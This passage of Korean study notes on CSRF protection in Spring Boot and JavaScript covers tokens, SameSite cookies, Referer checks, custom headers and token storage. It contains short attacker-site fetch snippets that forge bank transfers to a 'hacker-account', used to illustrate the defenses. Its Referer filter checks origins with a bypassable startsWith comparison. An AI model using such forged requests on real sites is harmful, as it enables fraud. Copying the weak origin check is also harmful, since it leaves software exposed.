</form>
```

- **AJAX 요청에서 CSRF 토큰 사용**:

```javascript
// ✅ AJAX에서 CSRF 토큰 포함
function transferMoney(toAccount, amount) {
  // 메타 태그에서 CSRF 토큰 가져오기
  const token = document.querySelector('meta[name="_csrf"]').content;
  const header = document.querySelector('meta[name="_csrf_header"]').content;

  fetch("/transfer", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      [header]: token, // CSRF 토큰을 헤더에 포함
    },
    body: JSON.stringify({
      toAccount: toAccount,
      amount: amount,
    }),
  }).then((response) => {
    if (response.ok) {
      alert("이체 완료!");
    } else {
      alert("이체 실패!");
    }
  });
}
```

2. 🍪 SameSite 쿠키 - "우리 집에서만 유효한 열쇠"

- **비유**: 집 열쇠가 우리 집 앞에서만 작동하고, 다른 곳에서는 작동 안 하는 시스템

```java
// ✅ SameSite 쿠키 설정
@PostMapping("/login")
public String login(@RequestParam String username,
                   @RequestParam String password,
                   HttpServletResponse response) {

    if (authService.authenticate(username, password)) {
        // SameSite 속성이 포함된 안전한 쿠키
        ResponseCookie authCookie = ResponseCookie.from("BANK_SESSION", "authenticated_user_123")
            .httpOnly(true)           // JavaScript 접근 차단
            .secure(true)             // HTTPS에서만 전송
            .sameSite("Strict")       // 같은 사이트에서만 전송 (CSRF 방어) ⭐️
            .maxAge(Duration.ofHours(1))
            .path("/")
            .build();

        response.addHeader("Set-Cookie", authCookie.toString());
        return "redirect:/dashboard";
    }
    return "login";
}

// 전역 쿠키 설정
@Configuration
public class CookieConfig {

    @Bean
    public ServletContextInitializer servletContextInitializer() {
        return servletContext -> {
            SessionCookieConfig sessionCookieConfig = servletContext.getSessionCookieConfig();
            sessionCookieConfig.setSameSite(SameSite.STRICT);  // 또는 LAX
            sessionCookieConfig.setHttpOnly(true);
            sessionCookieConfig.setSecure(true);
        };
    }
}
```

- **SameSite 옵션 비교**:

```java
// Strict: 가장 엄격 (다른 사이트에서 절대 전송 안됨)
cookie.setSameSite("Strict");   // 링크 클릭해도 쿠키 전송 안됨

// Lax: 중간 (안전한 요청만 허용)
cookie.setSameSite("Lax");      // GET 링크는 허용, POST 폼은 차단

// None: 제한 없음 (Secure와 함께 사용 필수)
cookie.setSameSite("None");     // 모든 사이트에서 전송 (HTTPS 필수)
```

3. 🔍 Referer 헤더 검증 - "신분증 확인"

- **비유**: 은행에서 "어디서 오셨나요?" 물어보고 신뢰할 수 있는 곳에서 온 사람만 업무 처리

```java
// ✅ Referer 헤더 검증 필터
@Component
public class RefererCSRFFilter implements Filter {

    private static final List<String> ALLOWED_ORIGINS = Arrays.asList(
        "https://mybank.com",
        "https://secure.mybank.com",
        "https://mobile.mybank.com"
    );

    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                        FilterChain chain) throws IOException, ServletException {

        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;

        // POST, PUT, DELETE 요청만 검증
        String method = httpRequest.getMethod();
        if ("POST".equals(method) || "PUT".equals(method) || "DELETE".equals(method)) {

            String referer = httpRequest.getHeader("Referer");
            String origin = httpRequest.getHeader("Origin");

            // Referer나 Origin 헤더 확인
            if (!isAllowedOrigin(referer) && !isAllowedOrigin(origin)) {
                log.warn("CSRF 공격 의심: Referer={}, Origin={}, RemoteAddr={}",
                        referer, origin, httpRequest.getRemoteAddr());

                httpResponse.setStatus(403);
                httpResponse.getWriter().write("Forbidden: Invalid origin");
                return;
            }
        }

        chain.doFilter(request, response);
    }

    private boolean isAllowedOrigin(String origin) {
        if (origin == null) return false;

        return ALLOWED_ORIGINS.stream()
            .anyMatch(allowedOrigin -> origin.startsWith(allowedOrigin));
    }
}

// 컨트롤러에서 직접 검증
@PostMapping("/transfer")
public String transfer(@RequestParam String toAccount,
                      @RequestParam int amount,
                      HttpServletRequest request) {

    // Referer 헤더 확인
    String referer = request.getHeader("Referer");
    if (referer == null || !referer.startsWith("https://mybank.com")) {
        throw new SecurityException("Invalid request origin");
    }

    // 정상 처리
    String userId = getCurrentUserId(request);
    transferService.transfer(userId, toAccount, amount);

    return "transfer-success";
}
```

4. 🎯 커스텀 헤더 요구 - "암호 문구"
   - **비유**: 은행에서 "오늘의 암호는?"이라고 물어보고, 정확한 답을 하는 사람만 업무 처리

```java
// ✅ 커스텀 헤더를 요구하는 API
@PostMapping("/api/transfer")
public ResponseEntity<String> transfer(
    @RequestHeader("X-Requested-With") String requestedWith,
    @RequestHeader("X-CSRF-Protection") String csrfProtection,
    @RequestBody TransferRequest request) {

    // 1. AJAX 요청인지 확인
    if (!"XMLHttpRequest".equals(requestedWith)) {
        return ResponseEntity.status(400).body("Invalid request type");
    }

    // 2. 커스텀 CSRF 보호 헤더 확인
    if (!"1".equals(csrfProtection)) {
        return ResponseEntity.status(403).body("CSRF protection header missing");
    }

    // 3. 정상 처리
    transferService.transfer(request.getFromAccount(), request.getToAccount(), request.getAmount());
    return ResponseEntity.ok("Transfer completed");
}
```

- **클라이언트에서 안전한 AJAX 요청**:

```javascript
// ✅ 커스텀 헤더를 포함한 안전한 AJAX
function secureTransfer(toAccount, amount) {
  fetch("/api/transfer", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Requested-With": "XMLHttpRequest", // AJAX 요청임을 명시
      "X-CSRF-Protection": "1", // 커스텀 보호 헤더
    },
    body: JSON.stringify({
      toAccount: toAccount,
      amount: amount,
    }),
  })
    .then((response) => {
      if (response.ok) {
        alert("이체 완료!");
      } else {
        alert("이체 실패!");
      }
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

// ❌ 악성 사이트에서는 이런 헤더를 추가할 수 없음
// 브라우저의 CORS 정책이 막아줌!
```

---

#### 🆚 RESTful API는 CSRF 공격이 불가능한가?

- **아니요! RESTful API도 CSRF 공격이 가능합니다.**

- CSRF 가능한 API (쿠키 인증)

```java
// ❌ 쿠키로 인증하는 API는 CSRF 위험!
@PostMapping("/api/transfer")
public ResponseEntity<String> transfer(
    @CookieValue("AUTH_TOKEN") String authToken,  // 쿠키 인증
    @RequestBody TransferRequest request) {

    if (tokenService.isValid(authToken)) {
        transferService.transfer(request);
        return ResponseEntity.ok("Success");
    }
    return ResponseEntity.status(401).build();
}
```

- **악성 사이트에서 공격**:

```javascript
// 악성 사이트에서 실행되는 코드
fetch("https://api.bank.com/transfer", {
  method: "POST",
  credentials: "include", // 쿠키 자동 포함!
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    toAccount: "hacker-account",
    amount: 1000000,
  }),
});
// 사용자가 로그인되어 있다면 공격 성공! 😱
```

- CSRF 불가능한 API (토큰 인증)

```java
// ✅ Authorization 헤더 인증은 CSRF 안전!
@PostMapping("/api/transfer")
public ResponseEntity<String> transfer(
    @RequestHeader("Authorization") String authHeader,  // 헤더 인증
    @RequestBody TransferRequest request) {

    if (!authHeader.startsWith("Bearer ")) {
        return ResponseEntity.status(401).build();
    }

    String token = authHeader.substring(7);
    if (tokenService.isValid(token)) {
        transferService.transfer(request);
        return ResponseEntity.ok("Success");
    }
    return ResponseEntity.status(401).build();
}
```

- **악성 사이트에서 공격 시도 (실패)**:

```javascript
// 악성 사이트에서 시도하지만 실패
fetch("https://api.bank.com/transfer", {
  method: "POST",
  headers: {
    Authorization: "Bearer " + token, // ❌ 악성 사이트는 토큰을 모름!
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
    toAccount: "hacker-account",
    amount: 1000000,
  }),
});
// 토큰을 알 수 없어서 공격 실패! ✅
```

---

#### 🎯 언제 어떤 방어법을 쓸까?

```java
// 1. 전통적인 웹 애플리케이션 (세션 기반)
@Configuration
public class WebAppCSRFConfig {

    @Bean
    public SecurityFilterChain webSecurityFilterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf ->
            csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        )
        .sessionManagement(session ->
            session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
        );

        return http.build();
    }
}

// 2. SPA + REST API (토큰 기반)
@Configuration
public class ApiCSRFConfig {

    @Bean
    public SecurityFilterChain apiSecurityFilterChain(HttpSecurity http) throws Exception {
        http.securityMatcher("/api/**")
            .csrf(csrf -> csrf.disable())  // API는 CSRF 토큰 대신 다른 방법
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .oauth2ResourceServer(oauth2 -> oauth2.jwt());  // JWT 토큰 사용

        return http.build();
    }
}

// 3. 하이브리드 (웹 + API)
@Configuration
public class HybridCSRFConfig {

    @Bean
    @Order(1)
    public SecurityFilterChain apiSecurityFilterChain(HttpSecurity http) throws Exception {
        http.securityMatcher("/api/**")
            .csrf(csrf -> csrf.disable())
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            .httpBasic(withDefaults());

        return http.build();
    }

    @Bean
    @Order(2)
    public SecurityFilterChain webSecurityFilterChain(HttpSecurity http) throws Exception {
        http.csrf(withDefaults())  // 웹 페이지는 CSRF 보호
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
            );

        return http.build();
    }
}
```

---

#### 💡 실무에서 기억할 핵심 4가지

1. 🎫 **상태 변경 요청에는 반드시 토큰**

```java
// GET은 괜찮지만, POST/PUT/DELETE는 토큰 필수!
@GetMapping("/user/{id}")   // ✅ 조회는 CSRF 위험 없음
@PostMapping("/user")       // ❌ 생성/수정/삭제는 CSRF 위험!
@PutMapping("/user/{id}")   // ❌ CSRF 토큰 필요!
@DeleteMapping("/user/{id}") // ❌ CSRF 토큰 필요!
```

2. 🍪 **쿠키 인증 = CSRF 위험, 헤더 인증 = 안전**

```java
// ❌ 위험: 쿠키 자동 전송
@CookieValue("AUTH_TOKEN") String token

// ✅ 안전: 헤더 수동 설정 필요
@RequestHeader("Authorization") String token
```

3. 🔒 **이중 삼중 방어**

```java
// 한 가지만 쓰지 말고 여러 방법 조합!
// CSRF 토큰 + SameSite 쿠키 + Referer 검증
```

4. 🎯 **API 설계 시 CSRF 고려**

```java
// 상태 변경이 필요한 GET 요청은 피하기
@GetMapping("/user/{id}/delete")  // ❌ 위험한 설계
@DeleteMapping("/user/{id}")      // ✅ 올바른 설계
```

> **기억하기 쉬운 방법**: **"토큰 → 쿠키설정 → 출처확인 → 헤더요구"** 이 4단계로 완벽 방어! 🛡️✨

---

### ✅ 토큰을 어디에 저장하는 것이 안전한가요?

| 저장 방식                 | XSS 공격    | CSRF 공격   | 편의성  | 자동로그인 | 권장 사용처      |
| ------------------------- | ----------- | ----------- | ------- | ---------- | ---------------- |
| **🍪 HttpOnly 쿠키**      | 🛡️ **안전** | ⚠️ **위험** | 🟢 높음 | ✅ 가능    | Refresh Token    |
| **📤 Authorization 헤더** | ⚠️ **위험** | 🛡️ **안전** | 🟡 중간 | ❌ 불가능  | Access Token     |
| **💾 localStorage**       | ⚠️ **위험** | 🛡️ **안전** | 🟢 높음 | ✅ 가능    | ❌ 권장하지 않음 |

#### 🎯 최적의 토큰 전략 (베스트 프랙티스)

```
🔑 Access Token (짧은 수명: 15분~1시간)
→ Authorization 헤더로 전송
→ 메모리에 저장 (JavaScript 변수)
→ 용도: API 호출 인증

🔄 Refresh Token (긴 수명: 7일~30일)
→ HttpOnly 쿠키로 저장
→ 용도: 자동로그인, Access Token 갱신
```

---

#### 💻 완전한 구현 코드

- 🖥️ 서버 구현 (Spring Boot)

```java
@RestController
public class AuthController {

    // 로그인 - 두 가지 토큰 발급
    @PostMapping("/api/login")
    public ResponseEntity<LoginResponse> login(
        @RequestBody LoginRequest request,
        HttpServletResponse response) {

        if (authService.authenticate(request.getUsername(), request.getPassword())) {

            // Access Token (짧은 수명)
            String accessToken = jwtService.generateAccessToken(
                request.getUsername(),
                Duration.ofMinutes(15)
            );

            // Refresh Token (긴 수명)
            String refreshToken = jwtService.generateRefreshToken(
                request.getUsername(),
                Duration.ofDays(30)
            );

            // Refresh Token을 HttpOnly 쿠키로 저장
            ResponseCookie refreshCookie = ResponseCookie.from("refreshToken", refreshToken)
                .httpOnly(true)         // JavaScript 접근 차단 (XSS 방어)
                .secure(true)           // HTTPS에서만 전송
                .sameSite("Strict")     // CSRF 방어
                .maxAge(Duration.ofDays(30))
                .path("/api/refresh")
                .build();

            response.addHeader("Set-Cookie", refreshCookie.toString());

            // Access Token만 응답으로 반환
            return ResponseEntity.ok(new LoginResponse(accessToken));
        }

        return ResponseEntity.status(401).build();
    }

    // Access Token 갱신
    @PostMapping("/api/refresh")
    public ResponseEntity<RefreshResponse> refresh(
        @CookieValue("refreshToken") String refreshToken) {

        if (jwtService.isValidRefreshToken(refreshToken)) {
            String username = jwtService.getUsernameFromRefreshToken(refreshToken);

            String newAccessToken = jwtService.generateAccessToken(
                username,
                Duration.ofMinutes(15)
            );

            return ResponseEntity.ok(new RefreshResponse(newAccessToken));
        }

        return ResponseEntity.status(401).build();
    }

    // 일반 API (Access Token 검증)
    @GetMapping("/api/profile")
    public ResponseEntity<User> getProfile(
        @RequestHeader("Authorization") String authHeader) {

        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            String accessToken = authHeader.substring(7);

            if (jwtService.isValidAccessToken(accessToken)) {
                String username = jwtService.getUsernameFromAccessToken(accessToken);
                User user = userService.getUser(username);
                return ResponseEntity.ok(user);
            }
        }

        return ResponseEntity.status(401).build();
    }

    // 로그아웃
    @PostMapping("/api/logout")
    public ResponseEntity<String> logout(HttpServletResponse response) {

        // Refresh Token 쿠키 삭제
        ResponseCookie deleteCookie = ResponseCookie.from("refreshToken", "")
            .httpOnly(true)
            .secure(true)
            .sameSite("Strict")
            .maxAge(0)  // 즉시 삭제
            .path("/api/refresh")
            .build();

        response.addHeader("Set-Cookie", deleteCookie.toString());
        return ResponseEntity.ok("로그아웃 성공");
    }
}
```

- 🌐 클라이언트 구현 (JavaScript)

```javascript
class AuthService {
  constructor() {
    this.accessToken = null;
    this.initializeAuth();
  }

  async initializeAuth() {
    // 페이지 로드 시 자동로그인 시도
    await this.refreshAccessToken();

    // 14분마다 토큰 자동 갱신
    setInterval(() => {
      if (this.accessToken) {
        this.refreshAccessToken();
      }
    }, 14 * 60 * 1000);
  }

  // 로그인
  async login(username, password) {
    try {
      const response = await fetch("/api/login", {
        method: "POST",
        credentials: "include", // HttpOnly 쿠키 받기 위해
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });

      if (response.ok) {
        const data = await response.json();
        this.accessToken = data.accessToken; // 메모리에 저장
        return true;
      }
    } catch (error) {
      console.error("로그인 실패:", error);
    }
    return false;
  }

  // Access Token 갱신 (자동로그인)
  async refreshAccessToken() {
    try {
      const response = await fetch("/api/refresh", {
        method: "POST",
        credentials: "include", // HttpOnly 쿠키 전송
      });

      if (response.ok) {
        const data = await response.json();
        this.accessToken = data.accessToken;
        return true;
      } else {
        this.logout();
      }
    } catch (error) {
      console.error("토큰 갱신 실패:", error);
    }
    return false;
  }

  // API 호출
  async fetchWithAuth(url, options = {}) {
    // Access Token이 없으면 갱신 시도
    if (!this.accessToken) {
      const refreshed = await this.refreshAccessToken();
      if (!refreshed) {
        throw new Error("인증이 필요합니다");
      }
    }

    return fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${this.accessToken}`, // 헤더로 전송
      },
      // credentials 불필요! (헤더로만 전송)
    });
  }

  // 로그아웃
  async logout() {
    this.accessToken = null;

    await fetch("/api/logout", {
      method: "POST",
      credentials: "include", // HttpOnly 쿠키 삭제 위해
    });

    window.location.href = "/login";
  }
}
```

---

#### 🛡️ 보안 메커니즘

1. XSS 공격 방어

```javascript
// 악성 스크립트가 실행되어도...

// ❌ Access Token: 메모리에 있지만 새로고침하면 사라짐
console.log(authService.accessToken); // 접근 가능하지만 수명 짧음

// ❌ Refresh Token: HttpOnly라 접근 불가
console.log(document.cookie); // refresh token 보이지 않음
localStorage.getItem("refreshToken"); // null

// ✅ 완전 탈취는 어려움!
```

2. CSRF 공격 방어

```html
<!-- 악성 사이트에서 시도해도... -->

<!-- ❌ Access Token: 헤더 수동 설정 필요 -->
<script>
  fetch("https://mybank.com/api/transfer", {
    method: "POST",
    headers: {
      Authorization: "Bearer ???", // 토큰을 모름!
    },
  });
  // ✅ CSRF 공격 실패!
</script>

<!-- ⚠️ Refresh Token: 쿠키 자동 전송 (SameSite로 방어) -->
<form action="https://mybank.com/api/refresh" method="POST">
  <!-- SameSite=Strict로 차단됨 -->
</form>
```

---

#### 🔄 credentials: 'include' 사용 가이드

- ✅ credentials 필요한 경우 (HttpOnly 쿠키 관련)

  ```javascript
  // 로그인 (HttpOnly 쿠키 받기)
  fetch("/api/login", { credentials: "include" });

  // 토큰 갱신 (HttpOnly 쿠키 보내기)
  fetch("/api/refresh", { credentials: "include" });

  // 로그아웃 (HttpOnly 쿠키 삭제)
  fetch("/api/logout", { credentials: "include" });
  ```

- ❌ credentials 불필요한 경우 (Access Token만 사용)

  ```javascript
  // 모든 일반 API 호출
  fetch("/api/profile", {
    headers: { Authorization: `Bearer ${token}` },
  });

  fetch("/api/users", {
    headers: { Authorization: `Bearer ${token}` },
  });
  ```

#### 🌐 브라우저 호환성

- SameSite 쿠키 지원
  ```
  ✅ 완전 지원: Chrome 80+, Firefox 79+, Safari 13.1+, Edge 86+
  ⚠️ 부분 지원: Chrome 51-79, Safari 12-13 (버그 있음)
  ❌ 미지원: IE 전체, Android 6 이하, iOS 11 이하
  ```
- 웹뷰 환경
  ```
  Android WebView: Android 10+ 권장 (Chrome 80+ 엔진)
  iOS WebView: iOS 13.4+ 권장 (Safari 13.1+ 엔진)
  구형 웹뷰: 앱 토큰 등 추가 보안 방법 필요
  ```

#### 🏆 최종 권장 아키텍처

```
🔐 로그인
→ Access Token (응답 body, 메모리 저장)
→ Refresh Token (HttpOnly 쿠키)

📱 API 호출
→ Authorization: Bearer {access_token}
→ credentials 불포함

🔄 토큰 갱신
→ POST /api/refresh
→ credentials: 'include' (HttpOnly 쿠키 전송)
→ 새로운 Access Token 반환

🚪 로그아웃
→ POST /api/logout
→ credentials: 'include' (쿠키 삭제)
→ 메모리 토큰 클리어
```

## 👀 궁금한 것

- CORS가 보안에 미치는 영향
- HTTP 메서드별 보안
- HMAC에 대해 더 알아보기
- X509

## 🎀 소감

- 예전에 AI없이 공부했을 때는 예시 코드 자료 찾는 것이 어려웠는데 지금은 좀 더 수월했습니다.
- 앞으로 보안 옵션을 추가할 때, 잘 알고서 추가하는 사람이 되길..
